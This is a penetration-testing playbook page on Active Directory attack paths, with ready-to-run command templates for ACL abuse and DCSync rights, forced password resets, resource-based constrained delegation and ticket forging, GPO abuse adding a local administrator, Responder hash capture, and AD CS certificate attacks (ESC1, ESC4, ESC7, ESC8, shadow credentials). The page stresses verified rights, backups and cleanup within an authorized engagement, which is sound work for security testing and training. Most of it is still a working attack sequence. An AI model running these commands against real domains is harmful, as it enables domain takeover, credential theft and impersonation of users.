---
title: AD attack-path checks
order: 4
tags: [ad, acl, delegation, adcs, bloodhound]
---

## ACL abuse

- [ ] Identify the object type, controlled principal and effective permission.
- [ ] Check inheritance and protected-object restrictions.
- [ ] Match the operation to the object: a group, user, computer and GPO expose different paths.
- [ ] Confirm the resulting access before marking the path complete.

[GenericAll reference](https://bloodhound.specterops.io/resources/edges/generic-all).

## ACL abuse operations

Read the DACL first. Use the narrowest state-changing operation supported by the verified edge, and save enough evidence to restore the original state.

```bash
# Read the target DACL
impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{TARGET_USER}}' -principal '{{USER}}' -action read
impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{TARGET_USER}}' -action backup -file '{{DACL_BACKUP}}'
```

Choose **one** operation matching the verified right. WriteOwner changes ownership;
record the original owner separately because a DACL backup does not back it up.

```bash
# If WriteOwner is confirmed
impacket-owneredit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{TARGET_USER}}' -new-owner '{{USER}}' -action write
```

```bash
# If WriteDacl is confirmed
impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{TARGET_USER}}' -principal '{{USER}}' -action write -rights ResetPassword
```

For the domain root, use its distinguished name with **-target-dn**. Back up that
object's DACL separately before this operation:

```bash
# DCSync rights against the domain root, only when the objective requires it
impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target-dn '{{DOMAIN_DN}}' -action backup -file '{{DOMAIN_DACL_BACKUP}}'
impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target-dn '{{DOMAIN_DN}}' -principal '{{USER}}' -action write -rights DCSync
```

Reset a target password only after the required right is verified:

```bash
impacket-changepasswd -reset -protocol smb-samr '{{DOMAIN}}/{{TARGET_USER}}'@'{{DC}}' -newpass '{{NEW_PASS}}' -altuser '{{DOMAIN}}/{{USER}}' -altpass '{{PASS}}'
```

Record the original DACL or object state, the changed principal, target object, exact right, and cleanup requirement. [Impacket dacledit](https://github.com/fortra/impacket/blob/master/examples/dacledit.py), [Impacket owneredit](https://github.com/fortra/impacket/blob/master/examples/owneredit.py), [Impacket changepasswd](https://github.com/fortra/impacket/blob/master/examples/changepasswd.py).

### Restore a recorded DACL

Review the saved backup and any concurrent legitimate changes before restoring.
Use the correct backup for the object that was modified:

```bash
impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -action restore -file '{{DACL_BACKUP}}'
```

Restore a changed owner separately to its recorded value. A password reset cannot
restore an unknown previous password; record that consequence before using it.

### Group membership operation

On Kali, confirm membership-control rights and record the group's original members.

```bash
bloodyAD --host '{{DC}}' -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' add groupMember '{{GROUP}}' '{{TARGET_USER}}'
```

Verify the resulting group and refresh the target account's logon/tickets. For
cleanup, remove only the membership added by this operation:

```bash
bloodyAD --host '{{DC}}' -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' remove groupMember '{{GROUP}}' '{{TARGET_USER}}'
```

[bloodyAD group operations](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide).

## Delegation prerequisites

- [ ] Identify unconstrained, constrained or resource-based constrained delegation.
- [ ] Record the controlled service, permitted SPNs and required host control.
- [ ] For TGT capture, confirm an incoming usable TGT; protected accounts can prevent forwarding.

For delegation types other than RBCD, verify the exact abuse command against the discovered delegation type and installed tool version.

[TGT path prerequisites](https://bloodhound.specterops.io/resources/edges/coerce-to-tgt), [protected accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts).

## Resource-based constrained delegation

Use only after confirming write access to the target computer and a controlled machine account or machine-account quota. These operations modify AD.

```bash
# Create a controlled computer account when quota permits
impacket-addcomputer -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -computer-name 'FAKE01$' -computer-pass '{{COMPUTER_PASS}}'
```

Read and record the target's current delegation descriptor before adding an entry:

```bash
impacket-rbcd -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -delegate-to '{{TARGET_COMPUTER}}$' -action read
```

```bash
# Allow the controlled account to impersonate users on the target
impacket-rbcd -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -delegate-from 'FAKE01$' -delegate-to '{{TARGET_COMPUTER}}$' -action write
```

```bash
# Request a ticket for the intended identity
impacket-getST -dc-ip '{{DC}}' -spn 'cifs/{{TARGET_COMPUTER}}.{{DOMAIN}}' -impersonate '{{TARGET_USER}}' '{{DOMAIN}}/FAKE01$:{{COMPUTER_PASS}}'
```

Set TICKET_PATH to the actual reported output filename, not an assumed username:

```bash
export KRB5CCNAME='{{TICKET_PATH}}'
klist -c "$KRB5CCNAME"
impacket-smbclient -k -no-pass -dc-ip '{{DC}}' '{{DOMAIN}}/{{TARGET_USER}}@{{TARGET_COMPUTER}}.{{DOMAIN}}'
```

Verify the ticket and resulting identity. Remove the RBCD entry when required:

```bash
impacket-rbcd -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -delegate-from 'FAKE01$' -delegate-to '{{TARGET_COMPUTER}}$' -action remove
```

Remove the controlled computer only if this exercise created it; keep any
pre-existing object and unrelated descriptor entries intact.

[Impacket addcomputer](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py), [Impacket rbcd](https://github.com/fortra/impacket/blob/master/examples/rbcd.py), [Impacket getST](https://github.com/fortra/impacket/blob/master/examples/getST.py).

## AD CS enrollment prerequisites

- [ ] Check enrollment rights, template publication, authentication EKUs and subject control.
- [ ] Check manager approval, required signatures, CA permissions and trust.
- [ ] Review missing CA/DC registry collection before trusting absent graph edges.
- [ ] Verify certificate authentication after issuance; issuance alone does not prove access.

[ESC1 conditions](https://bloodhound.specterops.io/resources/edges/adcs-esc1), [collector permissions](https://bloodhound.specterops.io/collect-data/sharphound-data-permissions).

## Certificate strong mapping after 2025

February 2025 updates made Full Enforcement the default. After the September 9, 2025 update, the compatibility registry override is unsupported. Verify the DC's patch state and strong certificate mapping before reusing older AD CS recipes. [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

## SMB signing prerequisites

Check the actual host and connection direction. Current Microsoft guidance distinguishes Server 2025 outbound defaults from Windows 11 24H2 edition-specific inbound/outbound defaults. A signing result alone does not establish an end-to-end relay path. [Microsoft signing guide](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing).

## LDAP signing and channel binding

Signing and TLS channel binding are separate controls. Server 2025 new deployments and upgrades can have different effective policies. Check both; an LDAPS endpoint alone does not prove relay resistance. [Signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing), [channel binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding).

## GPO permissions

When a controlled principal can edit a GPO that applies to a target computer, push a task or group change through it:

```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --GPOName "Default Domain Policy" --Command "cmd.exe" --Arguments "/c net localgroup administrators {{USER}} /add"
```

Confirm the GPO's scope links to an OU holding the target, then force a refresh or wait for policy application. [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse).

## Capture coerced authentication

Start Responder on the interface reachable from the target. Use a controlled service action or UNC path to trigger authentication; do not enable unrelated poisoning or DHCP features by default.

```bash
sudo responder -I '{{INTERFACE}}' -v
```

For an MSSQL trigger, use [xp_dirtree](services/databases#mssql-unc-authentication). Save the captured account and format, then use [NetNTLMv2 mode 5600](active-directory/credential-access#crack-a-captured-netntlmv2-response) when applicable. A capture does not prove relay access. [Responder quick start and SMB capture](https://github.com/lgandx/Responder).

## Enumerate AD CS with Certipy

Use a valid domain account and the confirmed DC. Enumerate enabled templates and CAs before choosing any request.

```bash
certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -enabled -text
```

Verify enrollment rights, authentication EKU, subject control, approval and signature requirements, CA permissions and strong mapping. A vulnerability label is a lead that still needs the listed conditions. [Certipy usage](https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage), [ESC conditions](https://posts.specterops.io/certified-pre-owned-d95910965cd2).

## Request and use an ESC1 certificate

Only after confirming ESC1 conditions. Set CA_HOST, CA, TEMPLATE, TARGET_USER and TARGET_SID from collected evidence. The request changes certificate state and must be within the authorized objective.

```bash
certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -template '{{TEMPLATE}}' -upn '{{TARGET_USER}}@{{DOMAIN}}' -sid '{{TARGET_SID}}'
certipy auth -pfx '{{TARGET_USER}}.pfx' -dc-ip '{{DC}}'
```

The second command expects the PFX filename produced by the request. Verify authentication rather than treating issuance as proof. If PKINIT fails, assess Schannel/LDAPS and strong mapping instead of repeating the same command. [Certipy find, req and auth workflow](https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage).

## ESC4 template modification

Use only when the current principal has verified write access to the template. Save the current template before changing it and restore it when required.

```bash
certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -enabled -vulnerable -text
certipy template -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -template '{{TEMPLATE}}' -save-configuration '{{TEMPLATE}}.json'
```

Only with the saved configuration and verified template write access:

```bash
certipy template -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -template '{{TEMPLATE}}' -write-default-configuration -force
```

Use the resulting ESC1 conditions with the correct target UPN and SID:

```bash
certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -template '{{TEMPLATE}}' -upn '{{TARGET_USER}}@{{DOMAIN}}' -sid '{{TARGET_SID}}'
```

Restore the saved template after verifying the issued certificate:

```bash
certipy template -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -template '{{TEMPLATE}}' -write-configuration '{{TEMPLATE}}.json' -force
```

[Certipy ESC4 workflow](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation).

## ESC7 CA management

This workflow requires verified **Manage CA** rights; Manage Certificates alone
does not imply permission to add officers or enable templates. Run on Kali.
Record the original officers and published templates before changing either.

```bash
certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -enabled -vulnerable -text
certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -list-templates
```

If required, add your controlled account as an officer:

```bash
certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -add-officer '{{USER}}'
```

Publish SubCA only if needed for the verified path:

```bash
certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -enable-template SubCA
```

Submit the request. A denied request can still have a Request ID. **Save its
private key when prompted**, and retain `REQUEST_ID.key` in the working folder.

```bash
certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -template SubCA -upn '{{TARGET_USER}}@{{DOMAIN}}' -sid '{{TARGET_SID}}'
```

Approve the recorded request, not an invented or another user's ID:

```bash
certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -issue-request '{{REQUEST_ID}}'
```

Retrieve it with its retained private key. Certipy looks for the matching
`REQUEST_ID.key` file; otherwise use the installed version's `-key-file` option.

```bash
certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -retrieve '{{REQUEST_ID}}'
```

Authenticate with the actual PFX output path and verify the intended identity:

```bash
certipy auth -pfx '{{PFX_PATH}}' -dc-ip '{{DC}}'
```

If the workflow added the officer, remove that added role after use:

```bash
certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -remove-officer '{{USER}}'
```

If it enabled SubCA, restore its prior unpublished state separately:

```bash
certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -disable-template SubCA
```

Restoring roles/templates does not revoke an issued certificate. Record issuance,
private-key handling and any remaining cleanup with the lab objective.
[Certipy ESC7 prerequisites and complete flow](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation).

## ESC8 relay conditions

Use only after confirming Web Enrollment, a relay-capable authentication trigger, signing/channel-binding state, and an authorized objective. Avoid running another SMB listener on the same interface as the relay.

```bash
sudo certipy relay -target 'http://{{CA_HOST}}' -template Machine -interface '{{LHOST}}'
# Trigger authentication from the target with the confirmed MSSQL, RPC, or web mechanism.
```

A relayed certificate is not access by itself; authenticate with it and verify the resulting identity. [Certipy command reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference).

## Certificate Schannel fallback

When PKINIT fails but the certificate is valid, test Schannel authentication to LDAP instead of repeating the same request.

```bash
certipy cert -pfx '{{TARGET_USER}}.pfx' -nokey -out '{{TARGET_USER}}.crt'
certipy cert -pfx '{{TARGET_USER}}.pfx' -nocert -out '{{TARGET_USER}}.key'
certipy auth -pfx '{{TARGET_USER}}.pfx' -dc-ip '{{DC}}' -ldap-shell
```

If Schannel works, perform only the required LDAP operation and verify the resulting identity. [Certipy auth](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference).

## Shadow credentials with Certipy

Use only when the current principal has verified write permission for msDS-KeyCredentialLink on TARGET_USER. This modifies the target object; record the change and remove added credentials when required by the engagement.

```bash
certipy shadow auto -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -account '{{TARGET_USER}}'
```

Use the generated credential to authenticate as the target identity. [Certipy shadow command](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference).
